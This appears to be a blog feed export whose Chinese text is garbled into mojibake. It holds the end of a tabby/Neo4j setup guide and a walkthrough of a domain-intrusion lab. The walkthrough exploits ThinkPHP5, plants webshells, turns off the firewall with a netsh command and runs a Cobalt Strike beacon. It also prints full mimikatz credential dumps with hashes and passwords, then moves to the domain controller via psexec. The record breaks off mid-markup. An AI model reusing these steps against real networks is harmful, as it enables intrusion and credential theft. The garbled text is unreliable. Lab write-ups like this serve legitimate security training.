å¯ä»¥é€šè¿‡å®˜æ–¹çš„neo4j-adminæ¥æ¨èé…ç½®å†…å­˜å¤§å°ï¼Œhttps://neo4j.com/docs/operations-manual/current/tools/neo4j-admin/neo4j-admin-memrec/<br>dbms.memory.heap.initial_size=1G<br>dbms.memory.heap.max_size=4G<br>dbms.memory.pagecache.size=4G<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯é…ç½®apocï¼Œå…ˆæ‰¾åˆ°é…ç½®æ–‡ä»¶çš„ç›®å½•</p><p>ç‚¹å‡»è¿™é‡Œä¼šç›´æ¥æ‰“å¼€å½“å‰é¡¹ç›®çš„é…ç½®æ–‡ä»¶ç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20241201013409500.png" alt="image-20241201013409500"></p><p><img src="https://cdn.clown2024.cn/image-20241201013343735.png" alt="image-20241201013343735"></p><p>æ–°å»ºapoc.confæ–‡ä»¶ï¼Œé…ç½®ä¸‹é¢å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">apoc.import.file.enabled=true<br>apoc.import.file.use_neo4j_config=false<br></code></pre></td></tr></table></figure><p>æœ€åé…ç½®ä¸€ä¸‹ apoc å’Œ tabby-path-finder æ’ä»¶ï¼Œæ‰“å¼€ plugins ç›®å½•å°†å¯¹åº”çš„ jar å¤åˆ¶åˆ°è¯¥ç›®å½•</p><p><img src="https://cdn.clown2024.cn/image-20241201013423656.png" alt="image-20241201013423656"></p><p>è¿™é‡Œä¸‹è½½çš„ä¸¤ä¸ªæ’ä»¶ç‰ˆæœ¬æœ‰è®²ç©¶ï¼Œä¸€å¼€å§‹æ¼çœ‹äº†ï¼Œå¯¼è‡´æ’ä»¶åŠ è½½å®Œæ•°æ®åº“éƒ½èµ·ä¸æ¥</p><blockquote><p>å…³äº apoc æ’ä»¶çš„ç‰ˆæœ¬é€‰æ‹©æ–¹æ³•ï¼šNeo4j æ•°æ®åº“ç‰ˆæœ¬çš„å‰ä¸¤ä½å¯¹åº” apoc æ’ä»¶çš„ç‰ˆæœ¬<br>æ¯”å¦‚ æˆ‘Neo4j æ•°æ®åº“ç‰ˆæœ¬ä¸º v5.24.0ï¼Œåˆ™é€‰æ‹© apoc æ’ä»¶ v5.2.x ç‰ˆæœ¬</p></blockquote><p>æˆ‘è¿™é‡Œå°±é€‰äº†ä¸¤ä¸ª5.24çš„</p><p><img src="https://cdn.clown2024.cn/image-20241201020830325.png" alt="image-20241201020830325"></p><p>ä¸Šè¿°æ­¥éª¤å®Œæˆä¹‹åé‡å¯æ•°æ®åº“</p><p>è¾“å…¥ä¸‹é¢ä¸¤ä¸ªæŒ‡ä»¤æ£€æŸ¥æ˜¯å¦é…ç½®æˆåŠŸ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">CALL apoc.help(&#x27;all&#x27;)<br>CALL tabby.help(&#x27;tabby&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201020937163.png" alt="image-20241201020937163"></p><p>ç„¶åå°±æ˜¯é…ç½®å›¾æ•°æ®åº“ç´¢å¼•ï¼Œè¿™ä¸ªæ˜¯ä¸ºäº†åŠ å¿«å¯¼å…¥&#x2F;åˆ é™¤çš„é€Ÿåº¦ï¼Œæå‰å¯¹èŠ‚ç‚¹è¿›è¡Œç´¢å¼•å»ºç«‹</p><p>æ‰§è¡Œä¸‹é¢çš„cypherè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">CREATE CONSTRAINT c1 IF NOT EXISTS FOR (c:Class) REQUIRE c.ID IS UNIQUE;<br>CREATE CONSTRAINT c2 IF NOT EXISTS FOR (c:Class) REQUIRE c.NAME IS UNIQUE;<br>CREATE CONSTRAINT c3 IF NOT EXISTS FOR (m:Method) REQUIRE m.ID IS UNIQUE;<br>CREATE CONSTRAINT c4 IF NOT EXISTS FOR (m:Method) REQUIRE m.SIGNATURE IS UNIQUE;<br>CREATE INDEX index1 IF NOT EXISTS FOR (m:Method) ON (m.NAME);<br>CREATE INDEX index2 IF NOT EXISTS FOR (m:Method) ON (m.CLASSNAME);<br>CREATE INDEX index3 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.CLASSNAME);<br>CREATE INDEX index4 IF NOT EXISTS FOR (m:Method) ON (m.NAME, m.NAME0);<br>CREATE INDEX index5 IF NOT EXISTS FOR (m:Method) ON (m.SIGNATURE);<br>CREATE INDEX index6 IF NOT EXISTS FOR (m:Method) ON (m.NAME0);<br>CREATE INDEX index7 IF NOT EXISTS FOR (m:Method) ON (m.NAME0, m.CLASSNAME);<br>:schema //æŸ¥çœ‹è¡¨åº“<br>:sysinfo //æŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241201021159909.png" alt="image-20241201021159909"></p><p><img src="https://cdn.clown2024.cn/image-20241201021255464.png" alt="image-20241201021255464"></p><p>è¿™æ˜¯åˆ é™¤æ‰€æœ‰çº¦æŸçš„è¯­å¥ï¼Œæœ‰éœ€è¦å¯ä»¥ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs cypher">DROP CONSTRAINT c1;<br>DROP CONSTRAINT c2;<br>DROP CONSTRAINT c3;<br>DROP CONSTRAINT c4;<br>DROP INDEX index1;<br>DROP INDEX index2;<br>DROP INDEX index3;<br>DROP INDEX index4;<br>DROP INDEX index5;<br>DROP INDEX index6;<br>DROP INDEX index7;<br></code></pre></td></tr></table></figure><h2 id="ideaæ’ä»¶å®‰è£…"><a href="#ideaæ’ä»¶å®‰è£…" class="headerlink" title="ideaæ’ä»¶å®‰è£…"></a>ideaæ’ä»¶å®‰è£…</h2><p>è¯¥æ’ä»¶æ˜¯ç”¨æ¥åŠ é€Ÿæˆ‘ä»¬çš„åˆ†æè¿‡ç¨‹çš„ï¼Œé€šå¸¸ä¸€æ¬¡å®Œæ•´çš„tabbyä½¿ç”¨æµç¨‹ä¸ºä¸‹é¢å‡ æ­¥ï¼š</p><ol><li>ç”Ÿæˆä»£ç å±æ€§å›¾</li><li>å¯¼å…¥å›¾æ•°æ®åº“neo4j</li><li>ä½¿ç”¨browseræŸ¥è¯¢æŒ‡å®šcypherè¯­å¥</li><li>å¤åˆ¶å¯¹åº”çš„classnameç­‰ä¿¡æ¯ååœ¨IDEAå®šä½åˆ°å¯¹åº”ä»£ç è¿›è¡Œäººå·¥ç¡®è®¤</li></ol><p>æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä¸‹è½½å®‰è£…æ’ä»¶ï¼Œæ’ä»¶åœ°å€ï¼š<a href="https://github.com/wh1t3p1g/tabby-intellij-plugin">https://github.com/wh1t3p1g/tabby-intellij-plugin</a></p><p>ä¸‹è½½å¥½æ˜¯ä¸€ä¸ªzipæ–‡ä»¶ï¼Œç„¶åå»ideaçš„æ’ä»¶å¸‚åœºé€‰æ‹©ä»ç£ç›˜å®‰è£…æ’ä»¶</p><p><img src="https://cdn.clown2024.cn/image-20241201021913952.png" alt="image-20241201021913952"></p><p>ç›´æ¥é€‰æ‹©æˆ‘ä»¬çš„zipæ–‡ä»¶ï¼Œä¸‹è½½å¥½åå¯ä»¥åœ¨å·²å®‰è£…æ’ä»¶ä¸­çœ‹åˆ°</p><p><img src="https://cdn.clown2024.cn/image-20241201022205930.png" alt="image-20241201022205930"></p><p>ç„¶åé…ç½®å¯¹åº”çš„æ•°æ®æº</p><p><img src="https://cdn.clown2024.cn/image-20241201022319862.png" alt="image-20241201022319862"></p><h1 id="è¿è¡Œç¤ºä¾‹"><a href="#è¿è¡Œç¤ºä¾‹" class="headerlink" title="è¿è¡Œç¤ºä¾‹"></a>è¿è¡Œç¤ºä¾‹</h1><p>è¿™é‡Œåœ¨caseç›®å½•é‡Œé¢æ”¾äº†ä¸€ä¸ªcc3.2.1çš„ä¾èµ–</p><p>ç„¶åä¸‹é¢å‘½ä»¤å¼€å§‹åˆ†æç”Ÿæˆæ•°æ®</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -Xmx4g -jar tabby.jar<br></code></pre></td></tr></table></figure><p>ç„¶åå°±ä¼šåœ¨outputç›®å½•ä¸‹ç”Ÿæˆä¸€ç³»åˆ—csvæ–‡ä»¶</p><p><img src="https://cdn.clown2024.cn/image-20241201140610659.png" alt="image-20241201140610659"></p><p>é«˜ç‰ˆæœ¬éœ€è¦ä½¿ç”¨tabby-vul-finderæ¥æ‰‹åŠ¨å¯¼å…¥ç”Ÿæˆçš„ç»“æœåˆ°å›¾æ•°æ®åº“ä¸­ï¼Œæ–‡ä»¶åœ°å€ï¼š<a href="https://github.com/wh1t3p1g/tabby-vul-finder">https://github.com/wh1t3p1g/tabby-vul-finder</a></p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -jar tabby-vul-finder.jar load D:\CTF\Java\å·¥å…·\tabby\output\dev<br></code></pre></td></tr></table></figure><p>è¿™æ ·å³å¯å®Œæˆå¯¼å…¥</p><p><img src="https://cdn.clown2024.cn/image-20241201140654291.png" alt="image-20241201140654291"></p><p>å±æ€§å›¾çš„ä»‹ç»åœ¨å®˜æ–¹æ–‡æ¡£é‡Œæœ‰è¯´æ˜ï¼š<a href="https://www.yuque.com/wh1t3p1g/tp0c1t/pppuq72tfhmic3g4">https://www.yuque.com/wh1t3p1g/tp0c1t/pppuq72tfhmic3g4</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¯å¢ƒé…ç½®&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒé…ç½®&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒé…ç½®&quot;&gt;&lt;/a&gt;ç¯å¢ƒé…ç½®&lt;/h1&gt;&lt;p&gt;è·Ÿç€å®˜æ–¹ç¯å¢ƒæ¥ï¼Œä½†æ˜¯å…·ä½“ä¸Šåˆæœ‰ç‚¹å‡ºå…¥ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹è¯¦ç»†æ­¥éª¤ï¼Œå®˜æ–¹æ–‡æ¡£ï¼š&lt;a href=&quot;https://www.yuque.</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>çº¢æ—¥é¶åœºäº”</title>
    <link href="https://clowsman.github.io/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/"/>
    <id>https://clowsman.github.io/2024/11/21/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%94/</id>
    <published>2024-11-20T17:01:38.000Z</published>
    <updated>2024-11-21T10:36:53.002Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><p><strong>è™šæ‹Ÿæœºå¯†ç </strong></p><p><strong>win7</strong></p><p>sun\heart 123.com</p><p>sun\Administrator dc123.comï¼ˆå› ä¸ºè¿‡æœŸäº†ï¼Œæ”¹æˆAdmin12345ï¼‰</p><p><strong>2008</strong></p><p>sun\admin 2020.comï¼ˆæ”¹æˆ2022.comï¼‰</p><p>Win7åŒç½‘å¡æ¨¡æ‹Ÿå†…å¤–ç½‘</p><p>ä»…ä¸»æœºæ¨¡å¼ç½‘å¡ï¼š192.168.138.0</p><p>NATæ¨¡å¼ç½‘å¡ï¼š192.168.135.0</p><p>é…ç½®å¥½åéœ€è¦è¿›å…¥win7ä¸»æœºå°†phpstudyæœåŠ¡å¼€èµ·æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241121125028618.png" alt="image-20241121125028618"></p><p>emmmè¯•äº†ä¸€ä¸‹åˆæ˜¯ä¸èƒ½pingé€šçš„ï¼Œä½†æ˜¯ç½‘é¡µèƒ½æ­£å¸¸è®¿é—®</p><h1 id="è€ƒç‚¹æ€è·¯"><a href="#è€ƒç‚¹æ€è·¯" class="headerlink" title="è€ƒç‚¹æ€è·¯"></a>è€ƒç‚¹æ€è·¯</h1><p><strong>ä¸€ã€ç¯å¢ƒæ­å»º</strong></p><ul><li><p>1.ç¯å¢ƒæ­å»ºæµ‹è¯•</p></li><li><p>2.ä¿¡æ¯æ”¶é›†</p></li></ul><p><strong>äºŒã€æ¼æ´åˆ©ç”¨</strong></p><ul><li><p>3.æ¼æ´æœç´¢ä¸åˆ©ç”¨</p></li><li><p>4.æ¼æ´åˆ©ç”¨Getshell</p></li><li><p>5.ç³»ç»Ÿä¿¡æ¯æ”¶é›†</p></li><li><p>6.ä¸»æœºå¯†ç æ”¶é›†</p></li></ul><p><strong>ä¸‰ã€å†…ç½‘æœé›†</strong></p><ul><li><p>7.å†…ç½‘â€“ç»§ç»­ä¿¡æ¯æ”¶é›†</p></li><li><p>8.å†…ç½‘æ”»å‡»å§¿åŠ¿â€“MS14-058</p></li><li><p>9.å†…ç½‘æ”»å‡»å§¿åŠ¿â€“MS17-010</p></li></ul><p><strong>å››ã€æ¨ªå‘ç§»åŠ¨</strong></p><ul><li><p>10.psexecè¿œæ§</p></li><li><p>11.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£</p></li><li><p>12.netshå¢åˆ é˜²ç«å¢™è§„åˆ™</p></li></ul><p><strong>äº”ã€æ„å»ºé€šé“</strong></p><ul><li>13.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-ä»£ç†è½¬å‘</li></ul><p><strong>å…­ã€æŒä¹…æ§åˆ¶</strong></p><ul><li><p>14.åŸŸæ¸—é€-åŸŸæˆå‘˜ä¿¡æ¯æ”¶é›†</p></li><li><p>15.åŸŸæ¸—é€-åŸºç¡€æœåŠ¡å¼±å£ä»¤æ¢æµ‹åŠæ·±åº¦åˆ©ç”¨ä¹‹powershell</p></li><li><p>16.åŸŸæ¸—é€-æ¨ªå‘ç§»åŠ¨[wmiåˆ©ç”¨]</p></li><li><p>17.åŸŸæ¸—é€-åŸŸæ§å®ç°ä¸åˆ©ç”¨</p></li></ul><p><strong>ä¸ƒã€ç—•è¿¹æ¸…ç†</strong></p><ul><li>18ã€æ—¥å¿—æ¸…ç†</li></ul><h1 id="å¤–ç½‘æ‰“ç‚¹"><a href="#å¤–ç½‘æ‰“ç‚¹" class="headerlink" title="å¤–ç½‘æ‰“ç‚¹"></a>å¤–ç½‘æ‰“ç‚¹</h1><p>å…ˆarp-scan -lçœ‹ä¸€ä¸‹å­˜æ´»ä¸»æœº</p><p><img src="https://cdn.clown2024.cn/image-20241121125732100.png" alt="image-20241121125732100"></p><p>æ‹¿åˆ°webæœåŠ¡å™¨åœ°å€ï¼š192.168.135.150</p><p>åšä¸€ä¸‹ç«¯å£æ‰«æ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">nmap -sS -v 192.168.135.150<br></code></pre></td></tr></table></figure><p>æ‰«å‡ºæ¥ä¸¤ä¸ªç«¯å£ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PORT     STATE SERVICE<br>80/tcp   open  http<br>3306/tcp open  mysql<br></code></pre></td></tr></table></figure><p>ç„¶åfscanæ‰«å‡ºæ¥ä¸€ä¸ª135ç«¯å£å¼€æ”¾ï¼Œä½†æ˜¯æˆ‘çš„fscanæ¼æ´æ¢æµ‹ä¸äº†ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘ä»¬æ‰‹åŠ¨å»çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241121130427924.png" alt="image-20241121130427924"></p><p>è®¿é—®ä¸€ä¸‹80ç«¯å£çš„æœåŠ¡å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªthinkphp5çš„æœåŠ¡</p><p><img src="https://cdn.clown2024.cn/image-20241121125627193.png" alt="image-20241121125627193"></p><p>ç”¨å·¥å…·ï¼š<a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3%E6%88%96%E8%80%85https://github.com/bewhale/thinkphp_gui_tools%E7%9C%8B%E7%9C%8B%E8%83%BD%E4%B8%8D%E8%83%BD%E4%B8%80%E6%8A%8A%E6%A2%AD%EF%BC%8C%E4%B8%8D%E8%BF%87%E6%9C%80%E5%A5%BD%E4%BD%BF%E7%94%A8java8%E6%9D%A5%E8%BF%90%E8%A1%8C%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E5%8E%BBOracle%E4%B8%8B%E8%BD%BD%E4%B8%80%E4%B8%AAjava8%E7%9A%84jdk">https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3æˆ–è€…https://github.com/bewhale/thinkphp_gui_toolsçœ‹çœ‹èƒ½ä¸èƒ½ä¸€æŠŠæ¢­ï¼Œä¸è¿‡æœ€å¥½ä½¿ç”¨java8æ¥è¿è¡Œï¼Œè¿™é‡Œå¯ä»¥å»Oracleä¸‹è½½ä¸€ä¸ªjava8çš„jdk</a></p><p><img src="https://cdn.clown2024.cn/image-20241121132256316.png" alt="image-20241121132256316"></p><p>è§£å‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">tar -xzvf jdk-8u401-linux-x64.tar.gz <br></code></pre></td></tr></table></figure><blockquote><p>æœ‰ç‚¹ç”·æ³µï¼Œè¿™å°kaliä¸€ç›´è¯´æˆ‘è¶…å†…å­˜ï¼Œæˆ‘æ¢äº†ä¸€å°kaliå°±å¯ä»¥äº†</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241121161223838.png" alt="image-20241121161223838"></p><p>å¯ä»¥çœ‹åˆ°æ‰«å‡ºäº†å››ä¸ªæ´äº†ï¼Œè¿™ä¸‹å¯ä»¥ä¸€æŠŠæ¢­äº†</p><p>é€‰æ‹©å¯¹åº”pocæ‰§è¡Œä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241121161320128.png" alt="image-20241121161320128"></p><p>å‘ç°å¯ä»¥æˆåŠŸï¼Œé‚£è¿™æ—¶å€™å°±ç›´æ¥getshellèšå‰‘è¿ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241121162241375.png" alt="image-20241121162241375"></p><p><img src="https://cdn.clown2024.cn/image-20241121162256002.png" alt="image-20241121162256002"></p><p>æˆåŠŸè¿æ¥</p><p>ä¸è¿‡ä¸ºäº†æ–¹ä¾¿ä¸Šä¼ csé©¬è¿™é‡Œè¿˜æ˜¯ä¸Šä¼ ä¸€ä¸ªå†°èé©¬æ¥è¿æ¥</p><p><img src="https://cdn.clown2024.cn/image-20241121163421297.png" alt="image-20241121163421297"></p><p>ç„¶åå…³ä¸€ä¸‹é˜²ç«å¢™å…ˆ</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241121163742545.png" alt="image-20241121163742545"></p><p>ç„¶åä¸Šä¼ ä¸€ä¸ªcsçš„æœ¨é©¬</p><p><img src="https://cdn.clown2024.cn/image-20241121164338443.png" alt="image-20241121164338443"></p><p>ç„¶åè¿è¡Œ</p><p><img src="https://cdn.clown2024.cn/image-20241121164413507.png" alt="image-20241121164413507"></p><p>å¯ä»¥çœ‹åˆ°ä¸»æœºæˆåŠŸä¸Šçº¿</p><h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><p>å¸¸è§„net viewçœ‹ä¸€ä¸‹ä¸»æœº</p><p><img src="https://cdn.clown2024.cn/image-20241121164636888.png" alt="image-20241121164636888"></p><p>å¯ä»¥çœ‹åˆ°åŸŸæ§çš„åœ°å€ä¸ºï¼š192.168.138.138</p><p>ç„¶åmimikatzè¿›è¡Œlogonpasswordsæ‹¿ä¸€ä¸‹å¯†ç ä¿¡æ¯</p><p><img src="https://cdn.clown2024.cn/image-20241121164833388.png" alt="image-20241121164833388"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Authentication Id : 0 ; 151193 (00000000:00024e99)<br>Session           : Interactive from 1<br>User Name         : Administrator<br>Domain            : SUN<br>Logon Server      : DC<br>Logon Time        : 2024/11/21 12:44:44<br>SID               : S-1-5-21-3388020223-1982701712-4030140183-500<br>msv :<br> [00000003] Primary<br> * Username : Administrator<br> * Domain   : SUN<br> * LM       : ac804745ee68ebea48116059303a4365<br> * NTLM     : ccef208c6485269c20db2cad21734fe7<br> * SHA1     : 58d1a25c09f4ee98209941b2b333fbe477d472a9<br>tspkg :<br> * Username : Administrator<br> * Domain   : SUN<br> * Password : Admin12345<br>wdigest :<br> * Username : Administrator<br> * Domain   : SUN<br> * Password : Admin12345<br>kerberos :<br> * Username : Administrator<br> * Domain   : SUN.COM<br> * Password : Admin12345<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 997 (00000000:000003e5)<br>Session           : Service from 0<br>User Name         : LOCAL SERVICE<br>Domain            : NT AUTHORITY<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-19<br>msv :<br>tspkg :<br>wdigest :<br> * Username : (null)<br> * Domain   : (null)<br> * Password : (null)<br>kerberos :<br> * Username : (null)<br> * Domain   : (null)<br> * Password : (null)<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 996 (00000000:000003e4)<br>Session           : Service from 0<br>User Name         : WIN7$<br>Domain            : SUN<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-20<br>msv :<br> [00000003] Primary<br> * Username : WIN7$<br> * Domain   : SUN<br> * NTLM     : 19a799ef7003f143f69e5eb204369f74<br> * SHA1     : e7a55023d5275327b14b77af9fb37f9929ce114d<br>tspkg :<br>wdigest :<br> * Username : WIN7$<br> * Domain   : SUN<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>kerberos :<br> * Username : win7$<br> * Domain   : SUN.COM<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 46807 (00000000:0000b6d7)<br>Session           : UndefinedLogonType from 0<br>User Name         : (null)<br>Domain            : (null)<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : <br>msv :<br> [00000003] Primary<br> * Username : WIN7$<br> * Domain   : SUN<br> * NTLM     : 19a799ef7003f143f69e5eb204369f74<br> * SHA1     : e7a55023d5275327b14b77af9fb37f9929ce114d<br>tspkg :<br>wdigest :<br>kerberos :<br>ssp :<br>credman :<br><br>Authentication Id : 0 ; 999 (00000000:000003e7)<br>Session           : UndefinedLogonType from 0<br>User Name         : WIN7$<br>Domain            : SUN<br>Logon Server      : (null)<br>Logon Time        : 2024/11/21 12:44:36<br>SID               : S-1-5-18<br>msv :<br>tspkg :<br>wdigest :<br> * Username : WIN7$<br> * Domain   : SUN<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>kerberos :<br> * Username : win7$<br> * Domain   : SUN.COM<br> * Password : db cc 80 3b b4 2a 72 b6 e9 7c 58 55 7d d4 39 9f c4 54 c6 09 ce f4 bf e6 dc 51 d9 be e0 fd e6 85 ff 87 b2 fd 38 ea ff 04 0c 9f cf 6f e6 26 01 9d 0c 48 06 6c 2c 4a 3e b3 26 77 b3 44 65 c6 04 37 bb 5c 5c cb 86 3d b3 4c 94 3a 96 92 e1 65 2a 94 7e 4b 43 ff 8f 0c b3 2e 5d 50 23 29 f8 55 70 c4 e3 41 a9 66 94 d2 38 40 af 9f 3c f6 b0 31 10 8e 21 22 0e 76 25 52 76 64 a7 95 3e b2 85 58 5f fa 18 2e bd 4f e3 99 6e 1d 49 80 00 8a 30 f2 aa 39 66 e1 36 9c 79 ad 7c cd fb ec c4 b8 2a 33 21 1c 9a 82 e3 8a e4 5e 12 f2 60 94 f0 ed fb ad 83 b5 9d 35 dd cd ac bd 23 3c 2d 6c a9 3a aa 93 60 c9 d6 1f 5a b9 95 5d 41 fb 70 02 ea 2c d1 8d b3 6f 82 70 0a 34 bf f3 10 42 25 56 e3 a9 b6 71 f5 03 f8 6f 84 6e 66 fa 9f 7b 23 43 ad f9 eb 15 43 59 <br>ssp :<br>credman :<br></code></pre></td></tr></table></figure><p>ç®¡ç†å‘˜å¯†ç ç›¸å…³çš„ä¿¡æ¯æˆ‘ä»¬ä¹Ÿå·²ç»æ‰¾åˆ°äº†</p><p>ç”¨æˆ·å“ˆå¸Œä¹Ÿæ‹¿ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>heart:1000:aad3b435b51404eeaad3b435b51404ee:a34efdd63a23abea4413ba73cafa5a30:::<br></code></pre></td></tr></table></figure><h2 id="æ‰“åŸŸæ§"><a href="#æ‰“åŸŸæ§" class="headerlink" title="æ‰“åŸŸæ§"></a>æ‰“åŸŸæ§</h2><p>æ¥ä¸‹æ¥å°±æ˜¯è¦æ‹¿ä¸‹åŸŸæ§äº†</p><p>æ—¢ç„¶éƒ½æ‹¿åˆ°hashäº†é‚£å°±ç›´æ¥psexecæ¨ªå‘ç§»åŠ¨ä¸€æŠŠæ¢­äº†</p><p>å»ºç«‹ä¸€ä¸ªsmbç›‘å¬å™¨</p><p><img src="https://cdn.clown2024.cn/image-20241121171441969.png" alt="image-20241121171441969"></p><p>ç„¶åç›´æ¥jump psexec</p><p><img src="https://cdn.clown2024.cn/image-20241121171456605.png" alt="image-20241121171456605"></p><p>æˆåŠŸä¸Šçº¿</p><p><img src="https://cdn.clown2024.cn/image-20241121171531530.png" alt="image-20241121171531530"></p><p><img src="https://cdn.clown2024.cn/image-20241121171543198.png" alt="image-20241121171543198"></p><p>psexecèƒ½ä¸€æŠŠæ¢­ä¸»è¦è¿˜æ˜¯DCä¸»æœºå¼€äº†$ADMINå…±äº«ç®¡é“</p><p><img 